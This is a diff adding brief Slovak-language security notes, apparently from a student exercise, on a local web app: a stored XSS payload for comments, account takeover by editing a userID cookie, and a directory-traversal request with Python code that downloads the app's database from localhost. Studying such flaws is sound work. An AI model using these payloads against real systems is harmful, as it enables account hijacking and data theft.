@@ -1,0 +1,16 @@
+* XSS mozes vlozit <script>alert('XSS');</script> do komentaru a spusti sa to
+
+* mozno na prihlasenie za ineho pouzivatela mozme menit cookie userID
+
+* unik dat z databaze:
+    line 60 v main.py, directory traversal
+    poslem GET request na tuto adresu:
+    http://127.0.0.1:5000/submission_img/?user=../db/&format=__main__
+
+    database = session.get("http://127.0.0.1:5000/submission_img/?user=../db/&format=__main__")
+    print(database)
+    <Response [200]>
+    file = open("/home/lubomir/Desktop/Gymnázium/4. ročník/KSI/kreslenie a dialogy/test", "wb")
+    file.write(database.content)  # https://365datascience.com/tutorials/python-tutorials/python-requests-package/
+    Out[15]: 928
+    file.close()
